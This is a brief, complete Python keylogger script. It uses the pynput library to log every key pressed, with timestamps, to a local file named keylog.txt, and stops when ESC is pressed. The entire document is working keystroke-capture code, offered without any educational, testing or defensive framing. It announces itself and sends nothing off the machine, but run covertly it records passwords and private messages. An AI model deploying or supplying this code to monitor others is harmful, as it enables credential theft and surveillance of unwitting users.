import pynput.keyboard
import logging

# Set up logging to file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False

if __name__ == "__main__":
    print("Keylogger started... Press ESC to stop.")
    # Collect events until released
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
